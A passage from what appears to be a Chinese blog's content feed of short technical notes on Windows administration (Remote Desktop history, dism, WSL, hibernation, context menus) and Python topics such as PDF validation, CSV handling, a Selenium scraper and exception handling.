PDFlib.PDFlib <span class="keyword">import</span> PDFlibException</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isValidPdf</span>(<span class="params">pathfile</span>):</span><br><span class="line">    p = PDFlib()</span><br><span class="line"></span><br><span class="line">    p.set_option(<span class="string">&quot;license=xxxxxx-xxxxxx-xxxxxx-xxxxxx-xxxxxx&quot;</span>)</span><br><span class="line">    p.set_option(<span class="string">&quot;errorpolicy=return&quot;</span>)</span><br><span class="line"></span><br><span class="line">    indoc = p.open_pdi_document(pathfile, <span class="string">&quot;repair=none&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;indoc:&quot;</span> + <span class="built_in">str</span>(indoc))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;pathfile size:&quot;</span> + <span class="built_in">str</span>(os.path.getsize(pathfile)) + <span class="string">&quot;B&quot;</span>)</span><br><span class="line">    bValid = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> indoc == -<span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;*&quot;</span> + p.get_errmsg())</span><br><span class="line">        bValid = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        pageNumber = p.pcos_get_number(indoc, <span class="string">&quot;length:pages&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;pageNumber:&quot;</span> + <span class="built_in">str</span>(pageNumber))</span><br><span class="line">        <span class="keyword">if</span> pageNumber &lt; <span class="number">1</span>:  <span class="comment"># 页数为0</span></span><br><span class="line">            bValid = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            bValid = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> bValid:</span><br><span class="line">        p.close_pdi_document(indoc)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bValid</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No15：Windows删除远程桌面连接记录</title>
      <link href="/posts/87174363.html"/>
      <url>/posts/87174363.html</url>
      
        <content type="html"><![CDATA[<ol><li><p>win+R输入”regedit”，打开注册表。</p></li><li><p>打开”HKEY_CURRENT_USER&#x2F;Software&#x2F;Microsoft&#x2F;Terminal Server Client&#x2F;Default”。</p></li><li><p>在”Default”的右侧可以看到远程连接记录的IP地址。</p></li><li><p>鼠标右键想要删除的远程连接记录。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No14：用dism命令安装NET FRAMEWORK</title>
      <link href="/posts/e8a56edc.html"/>
      <url>/posts/e8a56edc.html</url>
      
        <content type="html"><![CDATA[<ul><li><p>准备一个Windows10原版镜像，找到镜像\sources\sxs\文件夹，解压文件夹里包含‘netfx3’的文件。</p></li><li><p>以管理员身份运行Windows PowerShell。</p></li><li><p>输入命令。</p></li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dism.exe /online /add-package /packagepath:D:\microsoft-windows-netfx3-ondemand-package~31bf3856ad364e35~amd64~~.cab</span><br></pre></td></tr></table></figure><ul><li>重启系统即可。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No13：安装适用于Linux的Windows子系统(WSL)</title>
      <link href="/posts/c3a8cd57.html"/>
      <url>/posts/c3a8cd57.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、安装WSL"><a href="#1、安装WSL" class="headerlink" title="1、安装WSL"></a>1、安装WSL</h3><ul><li>启用适用于Linux的Windows子系统</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">以管理员身份打开PowerShell并运行</span></span><br><span class="line">dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart</span><br></pre></td></tr></table></figure><ul><li>检查系统版本</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">winver</span><br></pre></td></tr></table></figure><ul><li>启用虚拟机功能</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">以管理员身份打开PowerShell并运行</span></span><br><span class="line">dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart</span><br></pre></td></tr></table></figure><ul><li>下载Linux内核更新包</li></ul><p>Linux内核更新包<a href="https://wslstorestorage.blob.core.windows.net/wslblob/wsl_update_x64.msi">微软</a></p><ul><li>将WSL2设置为默认版本</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">以管理员身份打开PowerShell并运行</span></span><br><span class="line">wsl --set-default-version 2</span><br></pre></td></tr></table></figure><ul><li>安装所选的Linux分发</li></ul><p>打开Microsoft Store，并选择你偏好的Linux分发版。</p><h3 id="2、使用WSL安装Centos"><a href="#2、使用WSL安装Centos" class="headerlink" title="2、使用WSL安装Centos"></a>2、使用WSL安装Centos</h3><p>可用于WSL的CentOS镜像<a href="https://github.com/yuk7/CentWSL">GitHub</a></p><ul><li><p>解压WSLCentOS7.x</p></li><li><p>右键点击并以管理员身份运行CentOS.exe并安装</p></li><li><p>在WSL上卸载CentOS</p></li></ul><p>如果您因为某种原因不想使用了，可以使用下面命令在WSL上卸载CentOS：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./CentOS.exe clean</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No12：Windows启用或禁用休眠、保留的存储</title>
      <link href="/posts/b4cd74fa.html"/>
      <url>/posts/b4cd74fa.html</url>
      
        <content type="html"><![CDATA[<ul><li>休眠</li></ul><p>如果您禁止休眠，并且当混合睡眠设置打开时出现断电，您可能会丢失数据。禁用休眠时，混合睡眠将无法工作。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">关闭</span></span><br><span class="line">powercfg -h off</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开启</span></span><br><span class="line">powercfg -h on</span><br></pre></td></tr></table></figure><ul><li>保留的存储</li></ul><p>在Windows10上，保留存储是一项功能，通过保留存储，将留出一些磁盘空间以供更新、应用程序、临时文件和系统缓存使用。目标是通过确保关键的操作系统功能始终可以访问磁盘空间来改善电脑的日常功能。</p><p>如果没有保留的存储空间，当用户用完了他的存储空间后，则Windows系统和应用程序运行将变得不可靠。通过保留存储功能，当电脑的可用空间用完时，Windows会清理保留的存储，为其他进程（例如更新Windows）释放空间，以避免由于空间不足而导致的问题。</p><p>该功能自1903版开始可用，并且在全新安装后或在新制造的电脑上默认启用。</p><p>从2004版开始，Windows10为部署映像服务和管理（DISM）命令工具发布了新的命令，该命令使你可以确定是否配置了保留存储以及启用或禁用该功能。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">状态</span></span><br><span class="line">DISM.exe /Online /Get-ReservedStorageState</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">关闭</span></span><br><span class="line">DISM.exe /Online /Set-ReservedStorageState /State:Disabled</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开启</span></span><br><span class="line">DISM.exe /Online /Set-ReservedStorageState /State:Enabled</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No11：Python读写csv文件</title>
      <link href="/posts/40d68fb2.html"/>
      <url>/posts/40d68fb2.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、读文件"><a href="#1、读文件" class="headerlink" title="1、读文件"></a>1、读文件</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line">csv_reader = csv.reader(<span class="built_in">open</span>(<span class="string">&quot;data.file&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> csv_reader:</span><br><span class="line">    <span class="built_in">print</span>(row)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>csv_reader把每一行数据转化成了一个list，list中每个元素是一个字符串。</p><h3 id="2、写文件"><a href="#2、写文件" class="headerlink" title="2、写文件"></a>2、写文件</h3><p>读文件时，我们把csv文件读入列表中，写文件时会把列表中的元素写入到csv文件中。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span> = [<span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>, <span class="string">&quot;3&quot;</span>, <span class="string">&quot;4&quot;</span>]</span><br><span class="line">out = <span class="built_in">open</span>(outfile, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">csv_writer = csv.writer(out)</span><br><span class="line">csv_writer.writerow(<span class="built_in">list</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可能遇到的问题：直接使用这种写法会导致文件每一行后面会多一个空行。</p><p>解决办法如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">out = <span class="built_in">open</span>(outfile, <span class="string">&quot;w&quot;</span>, newline=<span class="string">&quot;&quot;</span>)</span><br><span class="line">csv_writer = csv.writer(out, dialect=<span class="string">&quot;excel&quot;</span>)</span><br><span class="line">csv_writer.writerow(<span class="built_in">list</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在stackoverflow上找到了比较经典的解释，原来python3里面对str和bytes类型做了严格的区分，</p><p>不像python2里面某些函数里可以混用。所以用python3来写wirterow时，打开文件不要用wb模式，只需要使用w模式，然后带上newline&#x3D;’’。</p><h3 id="3、示例"><a href="#3、示例" class="headerlink" title="3、示例"></a>3、示例</h3><ul><li>简单读写</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">writer</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.<span class="built_in">dict</span> = &#123;</span><br><span class="line">                <span class="string">&quot;标题&quot;</span>: <span class="string">&quot;标题&quot;</span>,</span><br><span class="line">                <span class="string">&quot;链接&quot;</span>: <span class="string">&quot;链接&quot;</span>,</span><br><span class="line">                <span class="string">&quot;服务&quot;</span>: <span class="string">&quot;服务&quot;</span>,</span><br><span class="line">                <span class="string">&quot;dsr&quot;</span>: <span class="string">&quot;dsr&quot;</span>,</span><br><span class="line">                <span class="string">&quot;店铺名&quot;</span>: <span class="string">&quot;店铺名&quot;</span>,</span><br><span class="line">                <span class="string">&quot;价格&quot;</span>: <span class="string">&quot;店铺名&quot;</span>,</span><br><span class="line">                <span class="string">&quot;付款人数&quot;</span>: <span class="string">&quot;付款人数&quot;</span>,</span><br><span class="line">                <span class="string">&quot;发货地&quot;</span>: <span class="string">&quot;发货地&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        out = <span class="built_in">open</span>(<span class="string">&quot;outfile.csv&quot;</span>, <span class="string">&quot;w&quot;</span>, newline=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.csv_writer = csv.writer(out, dialect=<span class="string">&quot;excel&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.csv_writer.writerow(<span class="variable language_">self</span>.<span class="built_in">dict</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">writer_to</span>(<span class="params">self, key_value</span>):</span><br><span class="line">        <span class="variable language_">self</span>.csv_writer.writerow(key_value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    a = writer()</span><br><span class="line">    new = &#123;</span><br><span class="line">            <span class="string">&quot;链接&quot;</span>: <span class="string">&quot;http://www.baidu.com&quot;</span>,</span><br><span class="line">            <span class="string">&quot;标题&quot;</span>: <span class="string">&quot;我是标题&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    a.<span class="built_in">dict</span>.update(new)</span><br><span class="line">    <span class="built_in">print</span>(a.<span class="built_in">dict</span>)</span><br><span class="line">    a.writer_to(a.<span class="built_in">dict</span>.values())</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>结合爬虫</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.ui <span class="keyword">import</span> WebDriverWait</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC</span><br><span class="line"><span class="keyword">from</span> selenium.common.exceptions <span class="keyword">import</span> TimeoutException, NoSuchElementException</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.action_chains <span class="keyword">import</span> ActionChains</span><br><span class="line"></span><br><span class="line">driver = [<span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>]</span><br><span class="line">colspan = [<span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>]</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    out = <span class="built_in">open</span>(<span class="string">&quot;类目.csv&quot;</span>, <span class="string">&quot;w&quot;</span>, newline=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> PermissionError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;文件被其他程序占用&quot;</span>)</span><br><span class="line">    <span class="built_in">input</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">csv_writer = csv.writer(out, dialect=<span class="string">&quot;excel&quot;</span>)</span><br><span class="line">csv_writer.writerow([<span class="string">&quot;宝贝ID&quot;</span>, <span class="string">&quot;类目&quot;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">open_chrome</span>():</span><br><span class="line">    driver[<span class="number">0</span>] = webdriver.Chrome()</span><br><span class="line">    driver[<span class="number">0</span>].get(<span class="string">&quot;https://www.dianchacha.com&quot;</span>)</span><br><span class="line">    <span class="built_in">input</span>(<span class="string">&quot;请登陆后按回车:&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">EC_located</span>(<span class="params">one_group, value</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">     目的：简化代码长度，参数1选择one或者group切换选中模式</span></span><br><span class="line"><span class="string">    :param value:要找的值【CSS选择器】</span></span><br><span class="line"><span class="string">    :return:选择到的对象</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    wait = WebDriverWait(driver[<span class="number">0</span>], <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">if</span> one_group == <span class="string">&quot;one&quot;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ecl = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, value)))</span><br><span class="line">            <span class="keyword">return</span> ecl</span><br><span class="line">        <span class="keyword">except</span> TimeoutException:</span><br><span class="line">            <span class="built_in">print</span>(value, <span class="string">&quot;1元素未加载成功，等待超时&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ecl = wait.until(</span><br><span class="line">                    EC.presence_of_all_elements_located((By.CSS_SELECTOR, value))</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">return</span> ecl</span><br><span class="line">        <span class="keyword">except</span> TimeoutException:</span><br><span class="line">            <span class="built_in">print</span>(value, <span class="string">&quot;1元素---组---未加载成功，等待超时&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">operating</span>(<span class="params">ID</span>):</span><br><span class="line">    <span class="comment"># 先获取ID输入框</span></span><br><span class="line">    driver[<span class="number">0</span>].get(<span class="string">&quot;https://www.dianchacha.com/item/info/index/iid/&quot;</span> + ID)</span><br><span class="line">    html = driver[<span class="number">0</span>].page_source</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;未能找到亲的宝贝&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> html:</span><br><span class="line">        colspans = EC_located(<span class="string">&quot;group&quot;</span>, <span class="string">&quot;.colspan-1&quot;</span>)</span><br><span class="line">        colspan[<span class="number">0</span>] = <span class="built_in">str</span>(colspans[<span class="number">1</span>].text).replace(<span class="string">&quot;宝贝类目： &quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> operating(ID)</span><br><span class="line">    <span class="built_in">print</span>(colspan)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">writer_txt</span>():</span><br><span class="line">    csv_writer.writerow([url[<span class="number">0</span>], colspan[<span class="number">0</span>]])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;保存&quot;</span>, url[<span class="number">0</span>], colspan[<span class="number">0</span>], <span class="string">&quot;成功&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = [<span class="string">&quot;0&quot;</span>, <span class="string">&quot;1&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    open_chrome()</span><br><span class="line">    file = <span class="string">&quot;宝贝ID.txt&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">            url[<span class="number">0</span>] = line</span><br><span class="line">            <span class="built_in">print</span>(line)</span><br><span class="line">            operating(url[<span class="number">0</span>])</span><br><span class="line">            writer_txt()</span><br><span class="line">        out.close()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;已完成&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No10：将Sublime添加到Windows鼠标右键</title>
      <link href="/posts/71d72850.html"/>
      <url>/posts/71d72850.html</url>
      
        <content type="html"><![CDATA[<h3 id="一、右键文件-管理员"><a href="#一、右键文件-管理员" class="headerlink" title="一、右键文件-管理员"></a>一、右键文件-管理员</h3><ol><li><p>win+R输入”regedit”，打开注册表。</p></li><li><p>找到”HKEY_CLASSES_ROOT*\shell”目录。</p></li><li><p>新建项”Open with Sublime”，更改右键文字显示内容”Edit with Sublime”。</p></li><li><p>新建字符串值”Icon”，更改程序图标路径”D:\PortableFiles\Sublime\Sublime.exe”。</p></li><li><p>在”Open with Sublime”项中新建子项”command”，更改程序路径（”D:\PortableFiles\Sublime\Sublime.exe” “%1”）。</p></li></ol><h3 id="二、右键文件夹空白区域-管理员"><a href="#二、右键文件夹空白区域-管理员" class="headerlink" title="二、右键文件夹空白区域-管理员"></a>二、右键文件夹空白区域-管理员</h3><ol><li><p>win+R输入”regedit”，打开注册表。</p></li><li><p>找到”HKEY_CLASSES_ROOT\Directory\shell”。</p></li><li><p>新建项”Sublime”，更改右键文字显示内容”Open Folder as Sublime Project”。</p></li><li><p>新建字符串值”Icon”，更改程序图标路径”D:\PortableFiles\Sublime\Sublime.exe”。</p></li><li><p>在”Sublime”项中新建子项”command”，更改程序路径（”D:\PortableFiles\Sublime\Sublime.exe” “%1”）。</p></li></ol><h3 id="三、右键桌面空白区域-管理员"><a href="#三、右键桌面空白区域-管理员" class="headerlink" title="三、右键桌面空白区域-管理员"></a>三、右键桌面空白区域-管理员</h3><ol><li><p>win+R输入”regedit”，打开注册表。</p></li><li><p>找到”HKEY_CLASSES_ROOT\Directory\Background\shell”。</p></li><li><p>新建项”Sublime”，更改右键文字显示内容”Open Folder as Sublime Project”。</p></li><li><p>新建字符串值”Icon”，更改程序图标路径”D:\PortableFiles\Sublime\Sublime.exe”。</p></li><li><p>在”Sublime”项中新建子项”command”，更改程序路径（”D:\PortableFiles\Sublime\Sublime.exe” “%V”）。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No9：Python的try捕获异常</title>
      <link href="/posts/b39782aa.html"/>
      <url>/posts/b39782aa.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、演示用法"><a href="#1、演示用法" class="headerlink" title="1、演示用法"></a>1、演示用法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># 主代码块</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">except</span> KeyError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="comment"># 异常时，执行该块</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># 主代码块执行完，执行该块</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="comment"># 无论异常与否，最终执行该块</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2、捕获异常"><a href="#2、捕获异常" class="headerlink" title="2、捕获异常"></a>2、捕获异常</h3><ul><li>单个异常</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">int</span>(<span class="string">&quot;error&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>多个异常</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">int</span>(<span class="string">&quot;error&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> IndexError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br><span class="line"><span class="keyword">except</span> KeyError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br><span class="line"><span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>先定义特殊提醒的异常，最后定义Exception，来确保程序正常运行并捕获所有异常</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">int</span>(<span class="string">&quot;error&quot;</span></span><br><span class="line"><span class="keyword">except</span> KeyError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No8：Python的traceback定位异常</title>
      <link href="/posts/623c5148.html"/>
      <url>/posts/623c5148.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、演示用法"><a href="#1、演示用法" class="headerlink" title="1、演示用法"></a>1、演示用法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"></span><br><span class="line"><span class="comment"># 异常栈输出</span></span><br><span class="line">traceback.print_exception(*sys.exc_info())</span><br><span class="line"><span class="comment"># traceback.print_exception()简化版</span></span><br><span class="line">traceback.print_exc()</span><br><span class="line"><span class="comment"># 异常栈以字符串的形式返回</span></span><br><span class="line">traceback.format_exc()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2、定位异常"><a href="#2、定位异常" class="headerlink" title="2、定位异常"></a>2、定位异常</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">raise</span> SyntaxError</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="comment"># 异常栈输出</span></span><br><span class="line">    traceback.print_exception(*sys.exc_info())</span><br><span class="line">    <span class="comment"># traceback.print_exception()简化版</span></span><br><span class="line">    traceback.print_exc()</span><br><span class="line">    <span class="comment"># 异常栈以字符串的形式返回</span></span><br><span class="line">    traceback.format_exc()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No7：Python的raise抛出异常</title>
      <link href="/posts/aa31c1c6.html"/>
      <url>/posts/aa31c1c6.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、演示用法"><a href="#1、演示用法" class="headerlink" title="1、演示用法"></a>1、演示用法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># 抛出异常，后面的代码将不能执行。</span></span><br><span class="line">    <span class="keyword">raise</span> NameError</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;抛出异常&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2、触发异常"><a href="#2、触发异常" class="headerlink" title="2、触发异常"></a>2、触发异常</h3><p>我们可以使用raise语句自己触发异常</p><p>raise语法格式如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">raise</span> [Exception[, args[, traceback]]]</span><br></pre></td></tr></table></figure><p>语句中Exception是异常的类型（例如，NameError）参数标准异常中任一种，args是自已提供的异常参数。</p><p>最后一个参数是可选的（在实践中很少使用），如果存在，是跟踪异常对象。</p><h3 id="3、自定义异常"><a href="#3、自定义异常" class="headerlink" title="3、自定义异常"></a>3、自定义异常</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyException</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, msg</span>):</span><br><span class="line">        <span class="variable language_">self</span>.message = msg</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.message</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">raise</span> MyException(<span class="string">&quot;自定义异常&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> MyException <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="4、Python标准异常"><a href="#4、Python标准异常" class="headerlink" title="4、Python标准异常"></a>4、Python标准异常</h3><table><thead><tr><th>异常</th><th>描述</th></tr></thead><tbody><tr><td>BaseException</td><td>所有异常的基类</td></tr><tr><td>SystemExit</td><td>解释器请求退出</td></tr><tr><td>KeyboardInterrupt</td><td>用户中断执行(通常是输入^C)</td></tr><tr><td>Exception</td><td>常规错误的基类</td></tr><tr><td>StopIteration</td><td>迭代器没有更多的值</td></tr><tr><td>GeneratorExit</td><td>生成器(generator)发生异常来通知退出</td></tr><tr><td>StandardError</td><td>所有的内建标准异常的基类</td></tr><tr><td>ArithmeticError</td><td>所有数值计算错误的基类</td></tr><tr><td>FloatingPointError</td><td>浮点计算错误</td></tr><tr><td>OverflowError</td><td>数值运算超出最大限制</td></tr><tr><td>ZeroDivisionError</td><td>除(或取模)零 